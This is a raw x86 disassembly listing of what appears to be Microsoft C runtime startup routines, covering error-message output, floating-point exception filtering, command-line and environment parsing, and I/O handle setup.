  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
